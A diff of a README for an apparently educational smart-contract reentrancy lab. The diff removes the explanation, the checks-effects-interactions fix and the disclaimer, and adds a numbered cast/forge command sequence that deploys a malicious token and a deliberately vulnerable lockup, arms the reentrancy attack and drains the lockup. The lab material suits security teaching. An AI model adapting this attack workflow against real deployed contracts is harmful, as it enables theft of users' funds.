@@ -1,90 +1,121 @@
-🔥 Lockup Reentrancy Lab
+# 🔥 Real Exploit Demonstration (cast workflow)
 
-A hands-on security research project demonstrating a real-world reentrancy vulnerability in a token lockup contract, along with a patched implementation.
-
----
-
-📌 Overview
-
-This repo contains:
-
-- ❌ Vulnerable lockup contract
-- 💥 Exploit using malicious token
-- ✅ Patched contract (CEI pattern)
-- 🧪 Foundry tests + invariant testing
+This project intentionally uses cast send to simulate a REAL attacker interaction flow instead of relying only on forge test.
 
 ---
 
-🧨 Vulnerability
+# 1️⃣ Deploy EvilToken
 
-The vulnerable contract performs:
+TOKEN=$(forge create src/EvilToken.sol:EvilToken \
+  --rpc-url $RPC \
+  --private-key $DEPLOYER_PK \
+  | grep "Deployed to:" | awk '{print $3}')
+Verify:
 
-token.transfer(...)
-balances[msg.sender] = 0;
+echo $TOKEN
+cast code $TOKEN
+---
 
-This violates the Checks-Effects-Interactions pattern and enables reentrancy.
+# 2️⃣ Deploy Vulnerable Lockup
+
+UNLOCK_TIME=$(($(date +%s) - 10))
+
+LOCKUP=$(forge create src/LockupVulnerable.sol:LockupVulnerable \
+  --rpc-url $RPC \
+  --private-key $DEPLOYER_PK \
+  --constructor-args $TOKEN $TOKEN $UNLOCK_TIME \
+  | grep "Deployed to:" | awk '{print $3}')
+Verify:
+
+echo $LOCKUP
+cast code $LOCKUP
+---
+
+# 3️⃣ Configure EvilToken Target
+
+cast send $TOKEN \
+  "setTarget(address)" \
+  $LOCKUP \
+  --private-key $DEPLOYER_PK \
+  --rpc-url $RPC
+---
+
+# 4️⃣ Disable Attack During Funding
+
+cast send $TOKEN \
+  "setAttack(bool)" false \
+  --private-key $DEPLOYER_PK \
+  --rpc-url $RPC
+---
+
+# 5️⃣ Fund Lockup
+
+cast send $TOKEN \
+  "transfer(address,uint256)" \
+  $LOCKUP 100000000000000000000 \
+  --private-key $DEPLOYER_PK \
+  --rpc-url $RPC
+---
+
+# 6️⃣ Register Deposit
+
+cast send $LOCKUP \
+  "deposit(uint256)" \
+  100000000000000000000 \
+  --private-key $ATTACKER_PK \
+  --rpc-url $RPC
+---
+
+# 7️⃣ Enable Reentrancy Attack
+
+cast send $TOKEN \
+  "setAttack(bool)" true \
+  --private-key $ATTACKER_PK \
+  --rpc-url $RPC
+---
+
+# 8️⃣ Check Balances BEFORE Exploit
+
+cast call $TOKEN \
+  "balanceOf(address)" \
+  $LOCKUP \
+  --rpc-url $RPC
+```bash
+cast call $TOKEN \
+  "balanceOf(address)" \
+  $TOKEN \
+  --rpc-url $RPC
 
 ---
 
-💥 Exploit Demo
+# 9️⃣ Execute Exploit
 
-Before exploit
-
-"Before" (screenshots/balances.png)
-
-Exploit execution
-
-"Exploit" (screenshots/exploit.png)
-
-After exploit
-
-Attacker drains more than intended due to repeated withdrawals.
+bash
+cast send $TOKEN \
+  "attack()" \
+  --private-key $ATTACKER_PK \
+  --rpc-url $RPC
 
 ---
 
-🛡️ Fix
+# 🔟 Check Balances AFTER Exploit
 
-The patched version applies:
+bash
+cast call $TOKEN \
+  "balanceOf(address)" \
+  $LOCKUP \
+  --rpc-url $RPC
 
-balances[msg.sender] = 0;
-token.transfer(...)
 
-Result
+bash
+cast call $TOKEN \
+  "balanceOf(address)" \
+  $TOKEN \
+  --rpc-url $RPC
 
-"Fixed" (screenshots/fixed.png)
+If the exploit succeeds:
 
----
-
-🚀 Run Locally
-
-forge build
-forge test -vv
-
-Start local chain:
-
-anvil
-
-Run exploit:
-
-./script.sh
-
----
-
-🌿 Branches
-
-- "main" → vulnerable version
-- "patched" → fixed version
-
----
-
-⚠️ Disclaimer
-
-This project is for educational purposes only.
-Do NOT use vulnerable code in production.
-
----
-
-🧠 Key Takeaway
-
-«Reentrancy is not about whether callbacks exist —
-it’s about when state changes relative to external calls.»
+text
+Lockup balance decreases repeatedly
+Attacker balance increases beyond intended withdrawal amount
+`
